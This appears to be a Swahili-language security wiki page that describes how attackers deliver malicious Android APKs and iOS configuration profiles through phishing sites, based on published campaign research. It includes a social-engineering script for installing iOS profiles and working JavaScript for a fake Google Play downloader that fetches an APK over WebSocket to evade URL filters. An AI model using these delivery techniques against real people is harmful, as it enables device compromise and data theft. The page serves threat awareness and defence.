# Hadaa ya Simu na Usambazaji wa Programu Hasidi (Android na iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> Ukurasa huu unaeleza mbinu zinazotumiwa na washambuliaji kusambaza **APK hasidi za Android** na **profaili za usanidi wa simu za iOS** kupitia hadaa (SEO, uhandisi wa kijamii, maduka bandia, programu za uchumba, n.k.).
> Maudhui haya yamechukuliwa kutoka kampeni ya SarangTrap iliyofichuliwa na Zimperium zLabs (2025) na utafiti mwingine wa umma.<sup>[[1]](#references)</sup>

## Mtiririko wa Shambulio

1. **Miundombinu ya SEO/Hadaa**
   * Sajili dazeni za vikoa vinavyofanana na halisi (uchumba, kushiriki maudhui kwenye cloud, huduma za magari…).  
     – Tumia maneno muhimu ya lugha ya eneo husika na emoji kwenye kipengele cha `<title>` ili kupata nafasi nzuri kwenye Google.  
     – Weka *maelekezo ya kusakinisha* Android (`.apk`) na iOS kwenye ukurasa huo huo wa kutua.
2. **Upakuaji wa Hatua ya Kwanza**
   * Android: kiungo cha moja kwa moja cha APK *isiyotiwa saini* au ya “duka la watu wengine”.  
   * iOS: kiungo cha `itms-services://` au cha HTTPS cha kawaida kinachoelekeza kwenye profaili hasidi ya **mobileconfig** (tazama hapa chini).
3. **Tabia ya Android Baada ya Usakinishaji**
   * Utekelezaji unaotegemea C2, matumizi mabaya ya ruhusa, njia za kukwepa ulinzi za dropper, ukusanyaji wa data chinichini, na tabia nyingine za malware baada ya usakinishaji zimeelezwa kwenye ukurasa maalum wa Android Malware Post-Exploitation hapa chini.
4. **Mbinu ya Uwasilishaji wa iOS**
   * Profaili moja ya **usanidi wa simu** inaweza kuomba `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` n.k. ili kusajili kifaa kwenye usimamizi unaofanana na “MDM”.  
   * Maelekezo ya uhandisi wa kijamii:
     1. Fungua Settings ➜ *Profile downloaded*.
     2. Gusa *Install* mara tatu (pamoja na picha za skrini kwenye ukurasa wa hadaa).  
     3. Kubali profaili isiyotiwa saini ➜ mshambuliaji hupata ruhusa ya kufikia *Contacts* na *Photo* bila ukaguzi wa App Store.
5. **Payload ya iOS Web Clip (ikoni ya programu ya hadaa)**
   * Payload za `com.apple.webClip.managed` zinaweza **kubandika URL ya hadaa kwenye Skrini ya Mwanzo** zikiwa na ikoni/lebo yenye chapa.
   * Web Clips zinaweza kufanya kazi **kwenye skrini nzima** (huficha kiolesura cha kivinjari) na kuwekwa kuwa **zisizoweza kuondolewa**, hivyo kumlazimisha mwathiriwa kufuta profaili ili kuondoa ikoni.<sup>[[3]](#references)</sup>
6. **Tabaka la Mtandao**
   * HTTP ya kawaida, mara nyingi kwenye port 80 ikiwa na kichwa cha HOST kama `api.<phishingdomain>.com`.
   * `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (hakuna TLS → rahisi kugundua).

## Android Malware Post-Exploitation

Kwa mbinu za Android malware baada ya usakinishaji kama C2, matumizi mabaya ya Accessibility, overlays, uendeshaji wa kiotomatiki wa ATS, upakiaji wa DEX kwa hatua, SMS za malipo ya juu, na persistence, tazama:

{{#ref}}
../basic-forensic-methodology/android-malware-post-exploitation.md
{{#endref}}

## Ufichaji wa APK kwa Socket.IO/WebSocket + Kurasa Bandia za Google Play

Washambuliaji wanazidi kubadilisha viungo tuli vya APK na chaneli ya Socket.IO/WebSocket iliyopachikwa kwenye mitego inayoonekana kama Google Play. Hii huficha URL ya payload, hukwepa vichujio vya URL/viendelezi, na huhifadhi uzoefu halisi wa usakinishaji.<sup>[[2]](#references)[[4]](#references)</sup>

Mtiririko wa kawaida wa mteja ulioonekana kwenye mashambulizi halisi:

<details>
<summary>Kipakuaji bandia cha Play kinachotumia Socket.IO (JavaScript)</summary>

```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
  const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url; a.download = "app.apk"; a.style.display = "none";
  document.body.appendChild(a); a.click();
});
```

</details>

Kwa nini inapita udhibiti rahisi:
- Hakuna URL tuli ya APK inayofichuliwa; payload hujengwa upya kwenye kumbukumbu kutoka kwenye fremu za WebSocket.
- Vichujio vya URL/MIME/kiendelezi vinavyozuia majibu ya moja kwa moja ya .apk vinaweza kukosa data ya binary inayopitishwa kupitia WebSockets/Socket.IO.
- Crawlers na sandbox za URL ambazo hazitekelezi WebSockets hazitapata payload.

Tazama pia mbinu na zana za WebSocket:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## References

- [1] [Upande wa Giza wa Mapenzi: Kampeni ya Uporaji ya SarangTrap](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [2] [Socket.IO](https://socket.io)
- [3] [Mipangilio ya payload ya Web Clips kwa vifaa vya Apple](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)
- [4] [Trojan ya Benki Inayolenga Watumiaji wa Android wa Indonesia na Vietnam](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
{{#include ../../banners/hacktricks-training.md}}
